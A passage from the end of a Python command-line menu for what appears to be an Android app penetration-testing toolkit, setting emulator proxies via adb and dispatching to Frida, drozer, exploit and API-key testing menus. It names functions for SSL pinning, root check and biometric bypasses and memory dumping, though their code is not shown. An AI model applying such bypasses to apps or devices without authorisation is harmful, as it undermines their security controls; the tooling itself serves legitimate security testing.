                        print(f"{iface:<30} {ip:<15}")
                    ip = input(Fore.CYAN + "📝 Enter the proxy IP address: " + Style.RESET_ALL).strip()
                    port = input(Fore.CYAN + "📝 Enter the proxy port: " + Style.RESET_ALL).strip()
                    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip) and port.isdigit():
                        subprocess.run(f'{adb_command} -s {device_serial} shell settings put global http_proxy {ip}:{port}', shell=True)
                        print(Fore.GREEN + f"✅ Proxy set to {ip}:{port} on the emulator." + Style.RESET_ALL)
                    else:
                        print(Fore.RED + "❌ Invalid IP address or port number." + Style.RESET_ALL)
                elif emulator_choice == '6':
                    subprocess.run(f'{adb_command} -s {device_serial} shell settings put global http_proxy :0', shell=True)
                    print(Fore.GREEN + "✅ Proxy removed from the emulator." + Style.RESET_ALL)
                elif emulator_choice == '7':
                    break
                else:
                    print(Fore.RED + "❗ Invalid choice, please try again." + Style.RESET_ALL)
        elif main_choice == '4':
            while True:
                show_frida_menu()
                frida_choice = input(Fore.CYAN + "🕵️ Enter your choice: " + Style.RESET_ALL).strip()
                if frida_choice == '1':
                    install_frida_server()
                elif frida_choice == '2':
                    run_frida_server()
                elif frida_choice == '3':
                    list_installed_applications()
                elif frida_choice == '4':
                    auto_fridump()
                elif frida_choice == '5':
                    run_ssl_pinning_bypass()
                elif frida_choice == '6':
                    run_root_check_bypass()
                elif frida_choice == '7':
                    android_biometric_bypass()
                elif frida_choice == '8':
                    run_custom_frida_script() 
                elif frida_choice == '9':
                    break
                else:
                    print(Fore.RED + "❗ Invalid choice, please try again." + Style.RESET_ALL)
        elif main_choice == '5':
            drozer_menu_loop()
        elif main_choice == '6':
            exploits_menu_loop()
        elif main_choice == '7':
            api_keys_testing_menu_loop()
        elif main_choice == '8':
            print(Fore.GREEN + "Exiting... Have a great day!" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "❌ Invalid choice, please try again." + Style.RESET_ALL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\nGraceful shutdown initiated. Goodbye!" + Style.RESET_ALL)
        sys.exit(0)
